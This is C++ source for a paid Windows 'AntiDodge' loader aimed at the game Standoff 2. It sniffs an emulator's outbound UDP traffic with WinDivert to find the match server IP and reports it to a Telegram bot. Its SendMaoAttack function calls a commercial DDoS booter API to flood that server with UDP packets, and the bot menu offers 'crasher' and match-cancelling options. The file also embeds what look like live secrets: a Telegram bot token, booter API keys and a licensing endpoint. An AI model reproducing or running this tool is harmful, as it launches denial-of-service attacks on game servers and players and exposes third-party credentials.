#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <map>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <random>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")

// ========== WinDivert ==========
typedef HANDLE(WINAPI* pWinDivertOpen)(const char*, DWORD, WORD, DWORD);
typedef BOOL(WINAPI* pWinDivertRecv)(HANDLE, void*, DWORD, DWORD*, void*);
typedef BOOL(WINAPI* pWinDivertClose)(HANDLE);
typedef BOOL(WINAPI* pWinDivertShutdown)(HANDLE, DWORD);

pWinDivertOpen WinDivertOpen = NULL;
pWinDivertRecv WinDivertRecv = NULL;
pWinDivertClose WinDivertClose = NULL;
pWinDivertShutdown WinDivertShutdown = NULL;

HMODULE g_hWinDivert = NULL;

bool LoadWinDivert() {
    g_hWinDivert = LoadLibraryA("WinDivert.dll");
    if (!g_hWinDivert) return false;
    
    WinDivertOpen = (pWinDivertOpen)GetProcAddress(g_hWinDivert, "WinDivertOpen");
    WinDivertRecv = (pWinDivertRecv)GetProcAddress(g_hWinDivert, "WinDivertRecv");
    WinDivertClose = (pWinDivertClose)GetProcAddress(g_hWinDivert, "WinDivertClose");
    WinDivertShutdown = (pWinDivertShutdown)GetProcAddress(g_hWinDivert, "WinDivertShutdown");
    
    return WinDivertOpen && WinDivertRecv && WinDivertClose && WinDivertShutdown;
}

void UnloadWinDivert() {
    if (g_hWinDivert) FreeLibrary(g_hWinDivert);
}

// ========== Конфигурация ==========
const std::string GOOGLE_API_URL = "https://script.google.com/macros/s/AKfycbyGZcv_RB2UTrgn9VwaDFuN_Z3QkbiqgoNUDEKKe3QyqkfNDQXDWslPk_TLYh2OTGEI/exec";
const std::string BOT_TOKEN = "8653498484:AAE1HIez8xwfKopD-FGH7mb7h8pwHgnJapU";
const std::string ADMIN_ID = "112065332";

const int MAO_USER = 10893;
const std::string MAO_KEYS_30 = "83zNHDrE0fD4Pv2nQd-MM9EJ71C";
const std::string MAO_KEYS_60 = "tF5-0T5q1pgDqfB9vIBGAF0T1BY";
const std::string MAO_KEYS_120 = "TIg445aV0QbgYXGej5y-SML88EC";

// ========== Реестр для лицензии ==========
bool SaveLicenseToRegistry(const std::string& key, int uid, int64_t expires) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\AntiDodgeSO2", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;
    
    RegSetValueExA(hKey, "license_key", 0, REG_SZ, (const BYTE*)key.c_str(), key.length() + 1);
    RegSetValueExA(hKey, "uid", 0, REG_DWORD, (const BYTE*)&uid, sizeof(uid));
    RegSetValueExA(hKey, "expires", 0, REG_QWORD, (const BYTE*)&expires, sizeof(expires));
    
    RegCloseKey(hKey);
    return true;
}

bool LoadLicenseFromRegistry(std::string& key, int& uid, int64_t& expires) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\AntiDodgeSO2", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return false;
    
    char buf[256];
    DWORD size = sizeof(buf);
    if (RegQueryValueExA(hKey, "license_key", NULL, NULL, (LPBYTE)buf, &size) == ERROR_SUCCESS)
        key = buf;
    
    DWORD uidDword = 0;
    size = sizeof(uidDword);
    if (RegQueryValueExA(hKey, "uid", NULL, NULL, (LPBYTE)&uidDword, &size) == ERROR_SUCCESS)
        uid = uidDword;
    
    size = sizeof(expires);
    RegQueryValueExA(hKey, "expires", NULL, NULL, (LPBYTE)&expires, &size);
    
    RegCloseKey(hKey);
    return true;
}

void ClearLicenseFromRegistry() {
    RegDeleteKeyA(HKEY_CURRENT_USER, "SOFTWARE\\AntiDodgeSO2");
}

// ========== HWID ==========
std::string GetHWID() {
    char buffer[256];
    DWORD serial = 0;
    
    if (GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, buffer, sizeof(buffer))) {
        char hwid[32];
        sprintf_s(hwid, "%08X", serial);
        return std::string(hwid);
    }
    return "UNKNOWN";
}

// ========== HTTP запросы ==========
std::string HttpPost(const std::string& url, const std::string& jsonData) {
    std::string host, path;
    size_t pos = url.find("://");
    if (pos != std::string::npos) pos += 3;
    else pos = 0;
    
    size_t slash = url.find("/", pos);
    if (slash != std::string::npos) {
        host = url.substr(pos, slash - pos);
        path = url.substr(slash);
    } else {
        host = url.substr(pos);
        path = "/";
    }
    
    HINTERNET hSession = WinHttpOpen(L"AntiDodge/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return "";
    
    std::wstring whost(host.begin(), host.end());
    HINTERNET hConnect = WinHttpConnect(hSession, whost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return "";
    }
    
    DWORD flags = WINHTTP_FLAG_SECURE;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", std::wstring(path.begin(), path.end()).c_str(), NULL, NULL, NULL, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }
    
    std::string headers = "Content-Type: application/json\r\n";
    WinHttpSendRequest(hRequest, std::wstring(headers.begin(), headers.end()).c_str(), headers.length(), (LPVOID)jsonData.c_str(), jsonData.length(), jsonData.length(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    std::string result;
    DWORD bytesRead = 0;
    char respBuffer[4096];
    while (WinHttpReadData(hRequest, respBuffer, sizeof(respBuffer) - 1, &bytesRead) && bytesRead > 0) {
        respBuffer[bytesRead] = 0;
        result += respBuffer;
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return result;
}

std::string HttpGet(const std::string& url) {
    std::string host, path;
    size_t pos = url.find("://");
    if (pos != std::string::npos) pos += 3;
    else pos = 0;
    
    size_t slash = url.find("/", pos);
    if (slash != std::string::npos) {
        host = url.substr(pos, slash - pos);
        path = url.substr(slash);
    } else {
        host = url.substr(pos);
        path = "/";
    }
    
    HINTERNET hSession = WinHttpOpen(L"AntiDodge/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return "";
    
    std::wstring whost(host.begin(), host.end());
    HINTERNET hConnect = WinHttpConnect(hSession, whost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return "";
    }
    
    DWORD flags = WINHTTP_FLAG_SECURE;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", std::wstring(path.begin(), path.end()).c_str(), NULL, NULL, NULL, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }
    
    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    std::string result;
    DWORD bytesRead = 0;
    char respBuffer[4096];
    while (WinHttpReadData(hRequest, respBuffer, sizeof(respBuffer) - 1, &bytesRead) && bytesRead > 0) {
        respBuffer[bytesRead] = 0;
        result += respBuffer;
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return result;
}

// ========== Проверка лицензии ==========
bool CheckLicense(const std::string& key, const std::string& hwid) {
    std::string json = "{\"action\":\"activate_loader\",\"loader_key\":\"" + key + "\",\"hwid\":\"" + hwid + "\"}";
    std::string response = HttpPost(GOOGLE_API_URL, json);
    
    return response.find("\"valid\":true") != std::string::npos;
}

// ========== Атака через Mao-Stress ==========
bool SendMaoAttack(const std::string& ip, int port, int duration) {
    std::string api_key;
    if (duration == 30) api_key = MAO_KEYS_30;
    else if (duration == 60) api_key = MAO_KEYS_60;
    else if (duration == 120) api_key = MAO_KEYS_120;
    else return false;
    
    std::string url = "https://mao-stress.su/api/start.php?user=" + std::to_string(MAO_USER) +
                      "&api_key=" + api_key +
                      "&target=" + ip +
                      "&port=" + std::to_string(port) +
                      "&duration=" + std::to_string(duration) +
                      "&method=UDP-PPS";
    
    std::string response = HttpGet(url);
    return response.find("Attack started") != std::string::npos;
}

// ========== Отправка уведомления в Telegram ==========
void SendTelegramNotification(const std::string& ip, int port) {
    std::string text = "🎮 *Обнаружен новый матч!*\n\nВыберите действие:";
    
    std::string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
    
    std::string escapedText = text;
    size_t pos = 0;
    while ((pos = escapedText.find("\"", pos)) != std::string::npos) {
        escapedText.replace(pos, 1, "\\\"");
        pos += 2;
    }
    
    std::string keyboard = "{\"inline_keyboard\":[["
        "{\"text\":\"🛡️ Антидодж (30 сек)\",\"callback_data\":\"antidodge_" + ip + "_" + std::to_string(port) + "\"}],"
        "[{\"text\":\"💀 Крашер (60 сек)\",\"callback_data\":\"crasher_" + ip + "_" + std::to_string(port) + "\"}],"
        "[{\"text\":\"❌ Отмена матча (120 сек)\",\"callback_data\":\"cancel_match_" + ip + "_" + std::to_string(port) + "\"}],"
        "[{\"text\":\"🔇 Отмена\",\"callback_data\":\"cancel\"}]]}";
    
    std::string json = "{\"chat_id\":\"" + ADMIN_ID + "\",\"text\":\"" + escapedText + "\",\"parse_mode\":\"Markdown\",\"reply_markup\":" + keyboard + "}";
    
    HttpPost(url, json);
}

// ========== Поиск PID HD-Player.exe ==========
DWORD GetHdPlayerPid() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "HD-Player.exe") == 0) {
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe));
    }
    
    CloseHandle(snapshot);
    return 0;
}

// ========== Поиск сервера через WinDivert ==========
bool FindGameServer(std::string& out_ip, int& out_port) {
    if (!LoadWinDivert()) return false;
    
    DWORD pid = GetHdPlayerPid();
    if (pid == 0) {
        UnloadWinDivert();
        return false;
    }
    
    const char* filter = "udp and outbound";
    HANDLE handle = WinDivertOpen(filter, 0, 0, 0);
    if (handle == INVALID_HANDLE_VALUE) {
        UnloadWinDivert();
        return false;
    }
    
    std::map<std::string, int> serverCounts;
    DWORD endTime = GetTickCount() + 5000;
    BYTE packet[4096];
    DWORD read;
    
    while (GetTickCount() < endTime) {
        if (WinDivertRecv(handle, packet, sizeof(packet), &read, NULL)) {
            for (int i = 0; i < (int)read - 20; i++) {
                if ((packet[i] & 0xF0) == 0x40 && i + 20 <= (int)read) {
                    struct in_addr addr;
                    addr.S_un.S_addr = *(DWORD*)(packet + i + 16);
                    char* ipStr = inet_ntoa(addr);
                    std::string ip(ipStr);
                    
                    if (ip.find("127.") != 0 && ip.find("192.168.") != 0 && 
                        ip.find("10.") != 0 && ip.find("172.") != 0) {
                        serverCounts[ip]++;
                    }
                    break;
                }
            }
        }
    }
    
    WinDivertShutdown(handle, 0);
    WinDivertClose(handle);
    UnloadWinDivert();
    
    if (serverCounts.empty()) return false;
    
    std::string bestIp;
    int bestCount = 0;
    for (const auto& pair : serverCounts) {
        if (pair.second > bestCount) {
            bestCount = pair.second;
            bestIp = pair.first;
        }
    }
    
    out_ip = bestIp;
    out_port = 0;
    return true;
}

// ========== Анти-отладка ==========
bool IsDebuggerPresent() {
    return ::IsDebuggerPresent();
}

// ========== Главная функция ==========
int main() {
    printf("AntiDodge SO2 Loader\n");
    printf("Telegram: @AntiDodgeSo2\n\n");
    
    if (IsDebuggerPresent()) {
        printf("Security violation: Debugger detected\n");
        printf("Press Enter to exit...");
        getchar();
        return 1;
    }
    
    std::string hwid = GetHWID();
    
    std::string license_key;
    int uid;
    int64_t expires;
    bool license_valid = false;
    
    if (LoadLicenseFromRegistry(license_key, uid, expires)) {
        if (CheckLicense(license_key, hwid)) {
            license_valid = true;
            printf("License: ACTIVE\n");
            printf("UID: %d\n", uid);
        } else {
            ClearLicenseFromRegistry();
        }
    }
    
    if (!license_valid) {
        printf("ACTIVATION REQUIRED\n");
        printf("Enter your license key: ");
        std::cin >> license_key;
        
        if (CheckLicense(license_key, hwid)) {
            SaveLicenseToRegistry(license_key, 1, 0);
            printf("License activated!\n");
            license_valid = true;
        } else {
            printf("Activation failed!\n");
            printf("Press Enter to exit...");
            getchar(); getchar();
            return 1;
        }
    }
    
    if (!license_valid) {
        printf("Press Enter to exit...");
        getchar();
        return 1;
    }
    
    printf("\nAntiDodge Work\n\n");
    printf("Start Standoff 2 match\n\n");
    
    std::string last_ip;
    
    while (true) {
        std::string ip;
        int port;
        
        if (FindGameServer(ip, port)) {
            if (ip != last_ip) {
                last_ip = ip;
                printf("Game server detected: %s\n", ip.c_str());
                SendTelegramNotification(ip, port);
                printf("Telegram notification sent\n");
            }
        }
        
        Sleep(10000);
    }
    
    return 0;
}